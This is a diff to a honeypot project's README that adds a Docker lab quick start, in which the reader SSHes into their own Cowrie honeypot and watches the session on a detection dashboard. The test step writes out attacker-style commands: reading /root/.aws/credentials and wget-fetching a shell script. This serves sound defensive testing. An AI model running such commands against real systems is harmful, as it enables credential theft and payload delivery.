@@ -77,6 +77,61 @@ Everything from the log parser onward is code in this repository. Cowrie is used
 
 ## Quick start
 
+Two ways to run it: the **lab path** below (Docker, about five minutes, nothing leaves your machine) or the **from source** path further down.
+
+### Try it in a lab
+
+You attack your own honeypot from a second machine (for example Kali) and watch it appear on the dashboard. Do this on a lab network, not on the open internet.
+
+| You need | Notes |
+|---|---|
+| A Linux machine or VM to host it (the *honeypot host*) | 2 GB RAM, 5 GB disk, any distribution |
+| Docker Engine with Compose v2 | `docker compose version` should print a version |
+| A second machine on the same network | Kali, or any computer with an SSH client |
+
+**1. On the honeypot host:** get the code and set two values.
+
+```bash
+git clone https://github.com/TurlaFSB/SuryaKundal.git && cd SuryaKundal
+cp .env.example .env && chmod 600 .env
+```
+
+Edit `.env` (the API keys can stay empty) and set:
+
+```bash
+DASHBOARD_TOKEN=choose-a-password-of-12-or-more-characters
+COWRIE_BIND=0.0.0.0          # lets your other machine reach the honeypot; the default is localhost only
+DASHBOARD_SHOW_INTERNAL=1    # lab traffic comes from private addresses, which are hidden by default
+```
+
+**2. Start it.**
+
+```bash
+docker compose --profile honeypot up -d --build
+docker compose ps            # cowrie, pipeline and dashboard should all become "healthy"
+```
+
+**3. From the second machine,** attack it. Weak root passwords are accepted on purpose (`123456`, `toor`, `admin`):
+
+```bash
+ssh -p 2222 root@<honeypot-host-ip>
+# inside: uname -a; cat /root/.aws/credentials; ls -la /root; wget http://example.com/x.sh
+```
+
+**4. Watch it.** The dashboard listens on the honeypot host's `127.0.0.1:8080` only. From the second machine, open a tunnel and browse to <http://127.0.0.1:8081> (any username, the password is your `DASHBOARD_TOKEN`):
+
+```bash
+ssh -L 8081:127.0.0.1:8080 <user>@<honeypot-host-ip>
+```
+
+You should see your session on the overview, the commands you typed on its page, and ATT&CK techniques such as T1082 (system information) and T1552.001 (credentials in files). Allow up to a minute for it to appear. Check the whole pipeline at any time with `docker compose exec pipeline surya-kundal doctor`.
+
+**Stop and clean up:** `docker compose --profile honeypot down` stops everything and keeps the data; add `-v` to delete the captured sessions as well.
+
+**Before exposing it to the internet,** read [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md), apply [`docs/EGRESS.md`](docs/EGRESS.md) so a compromised honeypot cannot attack anyone, and follow [`docs/DEPLOYMENT_AWS.md`](docs/DEPLOYMENT_AWS.md) for a cloud server.
+
+### From source
+
 **Requirements:** Python 3.11 or newer and a running Cowrie instance (see [`cowrie/README.md`](cowrie/README.md) for the settings used here).
 
 ```bash
@@ -96,7 +151,7 @@ In a second terminal:
 surya-kundal dashboard                     # http://127.0.0.1:8080
 ```
 
-### Docker
+### Docker in detail
 
 The whole stack runs as hardened containers (unprivileged users, read-only root filesystems, no Linux capabilities, resource limits). Wazuh runs separately.
 
